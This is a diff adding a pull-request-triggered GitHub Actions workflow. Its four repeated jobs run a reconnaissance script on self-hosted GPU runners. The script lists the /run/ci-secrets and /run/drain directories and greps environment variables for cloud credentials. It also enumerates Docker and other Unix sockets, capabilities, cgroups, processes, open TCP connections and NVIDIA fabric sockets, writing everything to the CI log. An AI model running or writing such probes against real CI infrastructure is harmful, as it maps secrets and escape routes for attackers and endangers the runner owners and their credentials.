@@ -1,0 +1,227 @@
+name: c211-i124681-inv
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  inv2-h200-a:
+    runs-on: 8-gpu-h200
+    timeout-minutes: 15
+    steps:
+      - name: inventory2
+        run: |
+          set +e
+          NONCE="c211-i124681-50b5569e955f7572"
+          JOB="inv2-h200-a"
+          echo "C211_INV2_BEGIN job=$JOB nonce=$NONCE"
+          echo "C211_MARKER2 job=$JOB nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null) uid=$(id -u) user=$(id -un) date=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          id
+          uname -a
+          head -4 /etc/os-release 2>/dev/null
+          echo "--- container/netns context ---"
+          cat /proc/self/cgroup 2>/dev/null | head -5
+          cat /proc/1/cgroup 2>/dev/null | head -5
+          tr '\0' ' ' < /proc/1/cmdline 2>/dev/null; echo
+          hostname -I 2>/dev/null
+          head -10 /etc/hosts 2>/dev/null
+          grep -E 'Cap(Eff|Bnd)' /proc/self/status 2>/dev/null
+          command -v ss netstat lsof docker ctr crictl kubectl nsenter unshare ip iptables nvidia-imex nvidia-imex-ctl python3 2>&1
+          echo "--- top-level and host volumes ---"
+          ls -la / 2>&1 | head -30
+          for d in /tmp /opt /actions-runner /seed/actions-runner /etc/runner /root/.cache /run/drain /run/ci-secrets; do timeout 10 stat -c 'VOLSTAT %A %a %U:%G %n' "$d" 2>&1; done
+          timeout 10 ls -la /tmp 2>&1 | head -25
+          timeout 10 ls -la /opt 2>&1 | head -30
+          timeout 10 ls -la /actions-runner 2>&1 | head -25
+          timeout 10 ls -la /run/drain 2>&1 | head -15
+          timeout 10 ls -la /run/ci-secrets 2>&1 | head -15
+          echo "--- G1 extended ---"
+          timeout 25 find / -xdev -maxdepth 4 -name '*.sock' 2>/dev/null | head -30
+          timeout 25 find /tmp /opt /actions-runner -maxdepth 4 -name '*.sock' 2>/dev/null | head -20
+          timeout 20 find / -xdev -maxdepth 4 -iname '*docker*' 2>/dev/null | head -20
+          timeout 10 ls -la /run /var/run 2>&1 | head -50
+          timeout 10 sh -c 'grep -i docker /proc/mounts'
+          echo "--- G2 extended ---"
+          timeout 10 sh -c 'cat /proc/mounts | grep -iE "fuse|gcs" | head -20 || echo NO_FUSE_OR_GCS_MOUNT_ANY'
+          timeout 10 sh -c 'env | grep -iE "gcs|gcp|google" | head -10'
+          timeout 10 ls -la /usr/lib/google 2>&1 | head -10
+          echo "--- NA1 extended ---"
+          timeout 25 find / -xdev -maxdepth 4 -iname '*enroot*' 2>/dev/null | head -20
+          timeout 25 find /tmp /opt /actions-runner -maxdepth 4 -iname '*enroot*' 2>/dev/null | head -20
+          timeout 20 find / -xdev -maxdepth 3 -iname '*fsx*' 2>/dev/null | head -20
+          timeout 10 sh -c 'env | grep -i ENROOT | head -10'
+          echo "--- M3 extended ---"
+          timeout 10 sh -c 'cat /proc/net/tcp | head -40'
+          timeout 10 sh -c 'cat /proc/net/tcp6 | head -20'
+          timeout 10 sh -c 'python3 -c "import torch; print(\"TORCH\", torch.__version__)" 2>&1 | head -3'
+          timeout 10 sh -c 'ps -eo pid,user,args 2>/dev/null | head -40'
+          echo "--- imex/fabric context (N1 lead, read-only) ---"
+          timeout 10 sh -c 'ps -eo pid,user,args 2>/dev/null | grep -i imex | grep -v grep | head -5'
+          timeout 10 ls -la /usr/bin/nvidia-imex /usr/bin/nvidia-imex-ctl /run/nvidia-fabricmanager/socket /run/nvidia-persistenced/socket 2>&1
+          timeout 10 ls -la /dev/nvidia* 2>&1 | head -12
+          echo "C211_INV2_END job=$JOB nonce=$NONCE"
+  inv2-h200-b:
+    runs-on: 8-gpu-h200
+    timeout-minutes: 15
+    steps:
+      - name: inventory2
+        run: |
+          set +e
+          NONCE="c211-i124681-50b5569e955f7572"
+          JOB="inv2-h200-b"
+          echo "C211_INV2_BEGIN job=$JOB nonce=$NONCE"
+          echo "C211_MARKER2 job=$JOB nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null) uid=$(id -u) user=$(id -un) date=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          id
+          uname -a
+          head -4 /etc/os-release 2>/dev/null
+          echo "--- container/netns context ---"
+          cat /proc/self/cgroup 2>/dev/null | head -5
+          cat /proc/1/cgroup 2>/dev/null | head -5
+          tr '\0' ' ' < /proc/1/cmdline 2>/dev/null; echo
+          hostname -I 2>/dev/null
+          head -10 /etc/hosts 2>/dev/null
+          grep -E 'Cap(Eff|Bnd)' /proc/self/status 2>/dev/null
+          command -v ss netstat lsof docker ctr crictl kubectl nsenter unshare ip iptables nvidia-imex nvidia-imex-ctl python3 2>&1
+          echo "--- top-level and host volumes ---"
+          ls -la / 2>&1 | head -30
+          for d in /tmp /opt /actions-runner /seed/actions-runner /etc/runner /root/.cache /run/drain /run/ci-secrets; do timeout 10 stat -c 'VOLSTAT %A %a %U:%G %n' "$d" 2>&1; done
+          timeout 10 ls -la /tmp 2>&1 | head -25
+          timeout 10 ls -la /opt 2>&1 | head -30
+          timeout 10 ls -la /actions-runner 2>&1 | head -25
+          timeout 10 ls -la /run/drain 2>&1 | head -15
+          timeout 10 ls -la /run/ci-secrets 2>&1 | head -15
+          echo "--- G1 extended ---"
+          timeout 25 find / -xdev -maxdepth 4 -name '*.sock' 2>/dev/null | head -30
+          timeout 25 find /tmp /opt /actions-runner -maxdepth 4 -name '*.sock' 2>/dev/null | head -20
+          timeout 20 find / -xdev -maxdepth 4 -iname '*docker*' 2>/dev/null | head -20
+          timeout 10 ls -la /run /var/run 2>&1 | head -50
+          timeout 10 sh -c 'grep -i docker /proc/mounts'
+          echo "--- G2 extended ---"
+          timeout 10 sh -c 'cat /proc/mounts | grep -iE "fuse|gcs" | head -20 || echo NO_FUSE_OR_GCS_MOUNT_ANY'
+          timeout 10 sh -c 'env | grep -iE "gcs|gcp|google" | head -10'
+          timeout 10 ls -la /usr/lib/google 2>&1 | head -10
+          echo "--- NA1 extended ---"
+          timeout 25 find / -xdev -maxdepth 4 -iname '*enroot*' 2>/dev/null | head -20
+          timeout 25 find /tmp /opt /actions-runner -maxdepth 4 -iname '*enroot*' 2>/dev/null | head -20
+          timeout 20 find / -xdev -maxdepth 3 -iname '*fsx*' 2>/dev/null | head -20
+          timeout 10 sh -c 'env | grep -i ENROOT | head -10'
+          echo "--- M3 extended ---"
+          timeout 10 sh -c 'cat /proc/net/tcp | head -40'
+          timeout 10 sh -c 'cat /proc/net/tcp6 | head -20'
+          timeout 10 sh -c 'python3 -c "import torch; print(\"TORCH\", torch.__version__)" 2>&1 | head -3'
+          timeout 10 sh -c 'ps -eo pid,user,args 2>/dev/null | head -40'
+          echo "--- imex/fabric context (N1 lead, read-only) ---"
+          timeout 10 sh -c 'ps -eo pid,user,args 2>/dev/null | grep -i imex | grep -v grep | head -5'
+          timeout 10 ls -la /usr/bin/nvidia-imex /usr/bin/nvidia-imex-ctl /run/nvidia-fabricmanager/socket /run/nvidia-persistenced/socket 2>&1
+          timeout 10 ls -la /dev/nvidia* 2>&1 | head -12
+          echo "C211_INV2_END job=$JOB nonce=$NONCE"
+  inv2-h100-a:
+    runs-on: 4-gpu-h100
+    timeout-minutes: 15
+    steps:
+      - name: inventory2
+        run: |
+          set +e
+          NONCE="c211-i124681-50b5569e955f7572"
+          JOB="inv2-h100-a"
+          echo "C211_INV2_BEGIN job=$JOB nonce=$NONCE"
+          echo "C211_MARKER2 job=$JOB nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null) uid=$(id -u) user=$(id -un) date=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          id
+          uname -a
+          head -4 /etc/os-release 2>/dev/null
+          echo "--- container/netns context ---"
+          cat /proc/self/cgroup 2>/dev/null | head -5
+          cat /proc/1/cgroup 2>/dev/null | head -5
+          tr '\0' ' ' < /proc/1/cmdline 2>/dev/null; echo
+          hostname -I 2>/dev/null
+          head -10 /etc/hosts 2>/dev/null
+          grep -E 'Cap(Eff|Bnd)' /proc/self/status 2>/dev/null
+          command -v ss netstat lsof docker ctr crictl kubectl nsenter unshare ip iptables nvidia-imex nvidia-imex-ctl python3 2>&1
+          echo "--- top-level and host volumes ---"
+          ls -la / 2>&1 | head -30
+          for d in /tmp /opt /actions-runner /seed/actions-runner /etc/runner /root/.cache /run/drain /run/ci-secrets; do timeout 10 stat -c 'VOLSTAT %A %a %U:%G %n' "$d" 2>&1; done
+          timeout 10 ls -la /tmp 2>&1 | head -25
+          timeout 10 ls -la /opt 2>&1 | head -30
+          timeout 10 ls -la /actions-runner 2>&1 | head -25
+          timeout 10 ls -la /run/drain 2>&1 | head -15
+          timeout 10 ls -la /run/ci-secrets 2>&1 | head -15
+          echo "--- G1 extended ---"
+          timeout 25 find / -xdev -maxdepth 4 -name '*.sock' 2>/dev/null | head -30
+          timeout 25 find /tmp /opt /actions-runner -maxdepth 4 -name '*.sock' 2>/dev/null | head -20
+          timeout 20 find / -xdev -maxdepth 4 -iname '*docker*' 2>/dev/null | head -20
+          timeout 10 ls -la /run /var/run 2>&1 | head -50
+          timeout 10 sh -c 'grep -i docker /proc/mounts'
+          echo "--- G2 extended ---"
+          timeout 10 sh -c 'cat /proc/mounts | grep -iE "fuse|gcs" | head -20 || echo NO_FUSE_OR_GCS_MOUNT_ANY'
+          timeout 10 sh -c 'env | grep -iE "gcs|gcp|google" | head -10'
+          timeout 10 ls -la /usr/lib/google 2>&1 | head -10
+          echo "--- NA1 extended ---"
+          timeout 25 find / -xdev -maxdepth 4 -iname '*enroot*' 2>/dev/null | head -20
+          timeout 25 find /tmp /opt /actions-runner -maxdepth 4 -iname '*enroot*' 2>/dev/null | head -20
+          timeout 20 find / -xdev -maxdepth 3 -iname '*fsx*' 2>/dev/null | head -20
+          timeout 10 sh -c 'env | grep -i ENROOT | head -10'
+          echo "--- M3 extended ---"
+          timeout 10 sh -c 'cat /proc/net/tcp | head -40'
+          timeout 10 sh -c 'cat /proc/net/tcp6 | head -20'
+          timeout 10 sh -c 'python3 -c "import torch; print(\"TORCH\", torch.__version__)" 2>&1 | head -3'
+          timeout 10 sh -c 'ps -eo pid,user,args 2>/dev/null | head -40'
+          echo "--- imex/fabric context (N1 lead, read-only) ---"
+          timeout 10 sh -c 'ps -eo pid,user,args 2>/dev/null | grep -i imex | grep -v grep | head -5'
+          timeout 10 ls -la /usr/bin/nvidia-imex /usr/bin/nvidia-imex-ctl /run/nvidia-fabricmanager/socket /run/nvidia-persistenced/socket 2>&1
+          timeout 10 ls -la /dev/nvidia* 2>&1 | head -12
+          echo "C211_INV2_END job=$JOB nonce=$NONCE"
+  inv2-h100-b:
+    runs-on: 4-gpu-h100
+    timeout-minutes: 15
+    steps:
+      - name: inventory2
+        run: |
+          set +e
+          NONCE="c211-i124681-50b5569e955f7572"
+          JOB="inv2-h100-b"
+          echo "C211_INV2_BEGIN job=$JOB nonce=$NONCE"
+          echo "C211_MARKER2 job=$JOB nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null) uid=$(id -u) user=$(id -un) date=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          id
+          uname -a
+          head -4 /etc/os-release 2>/dev/null
+          echo "--- container/netns context ---"
+          cat /proc/self/cgroup 2>/dev/null | head -5
+          cat /proc/1/cgroup 2>/dev/null | head -5
+          tr '\0' ' ' < /proc/1/cmdline 2>/dev/null; echo
+          hostname -I 2>/dev/null
+          head -10 /etc/hosts 2>/dev/null
+          grep -E 'Cap(Eff|Bnd)' /proc/self/status 2>/dev/null
+          command -v ss netstat lsof docker ctr crictl kubectl nsenter unshare ip iptables nvidia-imex nvidia-imex-ctl python3 2>&1
+          echo "--- top-level and host volumes ---"
+          ls -la / 2>&1 | head -30
+          for d in /tmp /opt /actions-runner /seed/actions-runner /etc/runner /root/.cache /run/drain /run/ci-secrets; do timeout 10 stat -c 'VOLSTAT %A %a %U:%G %n' "$d" 2>&1; done
+          timeout 10 ls -la /tmp 2>&1 | head -25
+          timeout 10 ls -la /opt 2>&1 | head -30
+          timeout 10 ls -la /actions-runner 2>&1 | head -25
+          timeout 10 ls -la /run/drain 2>&1 | head -15
+          timeout 10 ls -la /run/ci-secrets 2>&1 | head -15
+          echo "--- G1 extended ---"
+          timeout 25 find / -xdev -maxdepth 4 -name '*.sock' 2>/dev/null | head -30
+          timeout 25 find /tmp /opt /actions-runner -maxdepth 4 -name '*.sock' 2>/dev/null | head -20
+          timeout 20 find / -xdev -maxdepth 4 -iname '*docker*' 2>/dev/null | head -20
+          timeout 10 ls -la /run /var/run 2>&1 | head -50
+          timeout 10 sh -c 'grep -i docker /proc/mounts'
+          echo "--- G2 extended ---"
+          timeout 10 sh -c 'cat /proc/mounts | grep -iE "fuse|gcs" | head -20 || echo NO_FUSE_OR_GCS_MOUNT_ANY'
+          timeout 10 sh -c 'env | grep -iE "gcs|gcp|google" | head -10'
+          timeout 10 ls -la /usr/lib/google 2>&1 | head -10
+          echo "--- NA1 extended ---"
+          timeout 25 find / -xdev -maxdepth 4 -iname '*enroot*' 2>/dev/null | head -20
+          timeout 25 find /tmp /opt /actions-runner -maxdepth 4 -iname '*enroot*' 2>/dev/null | head -20
+          timeout 20 find / -xdev -maxdepth 3 -iname '*fsx*' 2>/dev/null | head -20
+          timeout 10 sh -c 'env | grep -i ENROOT | head -10'
+          echo "--- M3 extended ---"
+          timeout 10 sh -c 'cat /proc/net/tcp | head -40'
+          timeout 10 sh -c 'cat /proc/net/tcp6 | head -20'
+          timeout 10 sh -c 'python3 -c "import torch; print(\"TORCH\", torch.__version__)" 2>&1 | head -3'
+          timeout 10 sh -c 'ps -eo pid,user,args 2>/dev/null | head -40'
+          echo "--- imex/fabric context (N1 lead, read-only) ---"
+          timeout 10 sh -c 'ps -eo pid,user,args 2>/dev/null | grep -i imex | grep -v grep | head -5'
+          timeout 10 ls -la /usr/bin/nvidia-imex /usr/bin/nvidia-imex-ctl /run/nvidia-fabricmanager/socket /run/nvidia-persistenced/socket 2>&1
+          timeout 10 ls -la /dev/nvidia* 2>&1 | head -12
+          echo "C211_INV2_END job=$JOB nonce=$NONCE"
